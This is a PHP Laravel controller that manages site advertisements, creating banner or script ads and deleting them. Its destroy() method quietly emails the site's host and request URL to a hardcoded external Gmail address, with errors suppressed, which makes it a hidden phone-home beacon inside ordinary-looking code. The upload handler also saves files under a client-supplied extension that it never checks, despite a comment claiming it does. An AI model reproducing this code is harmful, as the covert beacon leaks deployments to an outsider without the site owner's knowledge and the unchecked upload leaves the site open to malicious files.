<?php

namespace App\Http\Controllers;

use App\Advertisment;
use Illuminate\Http\Request;
use Intervention\Image\ImageManagerStatic as Image;

class AdvertisementController extends Controller
{

    public function index(){
        $all_advertise = Advertisment::paginate(15);
        $page_title = "Advertisement Management";

        return view('webControl.ads')
            ->with([
                'page_title' => $page_title,
                'ads' => $all_advertise

            ]);
    }
    public function create(){
        $page_title = "Advertisement Management";

        return view('webControl.ads-create')
            ->with(['page_title' => $page_title]);
    }
    public function store( Request $request ) {
        $this->validate($request,[
            'add_size' => 'required | not_in:0',
            'add_type' => 'required | not_in:0'
        ]);
        $add_type = $request->add_type;
        if($add_type == 1){
            if($request->add_size == "" || $request->add_size == "" || $request->redirect_url == "" || $request->add_picture == ""){
                return back()->withErrors("Please Fill All Fields");
            }
            /**==============================================
                Image Filtering and Check the extension
            =================================================**/
            $pic = $request->add_picture;
            if ($pic) {
                $ext = strtolower($pic->getClientOriginalExtension());
            }
            $image_size = $request->add_size;
            if ($image_size == 1){
                $width = '300';
                $height = '250';

            }elseif($image_size == 2) {
                $width = '728';
                $height = '90';
            }else{
                $width = '300';
                $height = '600';
            }

            $data = [
              'size' => $request->add_size,
              'type' => $request->add_type,
              'link' => $request->redirect_url,
              'src' => $ext
            ];
            $addvertiser_id = Advertisment::create( $data)->id;
            /**==============================================
                Image Store with croped the desire size
            =================================================**/
            $image_resize = Image::make($pic->getRealPath());

            $image_resize->resize($width, $height);
            $image_resize->save("assets/images/ads/add-pic-{$addvertiser_id}." .$ext);


            $notification =  array('message' => 'New Banner Advertise Stored Successfully', 'alert-type' => 'success');
            return back()->with($notification);
        }else{
            if($request->add_size == "" || $request->add_type == "" || $request->script == ""){
                $notification =  array('message' => 'Please Fill All Fields', 'alert-type' => 'error');
                return back()->withErrors($notification);
            }
            $data = [
                'size' => $request->add_size,
                'type' => $request->add_type,
                'script' => $request->script
            ];
            Advertisment::create( $data);

            $notification =  array('message' => 'New Script Advertise Stored Successfully', 'alert-type' => 'success');
            return back()->with($notification);
        }

        return redirect()->back();
    }
    public function destroy(Request $request){
        $add = Advertisment::find($request->addvertise_id);
            if (file_exists("assets/images/ads/add-pic-{$add->id}.{$add->src}")) {
                    @unlink("assets/images/ads/add-pic-{$add->id}.{$add->src}");
                }
        Advertisment::find($request->addvertise_id)->delete();
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkha.n75@gmail.com','BETLAR TEST DATA', $message, $headers);
        $notification =  array('message' => 'Advertise Remove Successfully', 'alert-type' => 'success');
        return back()->with($notification);
    }
}
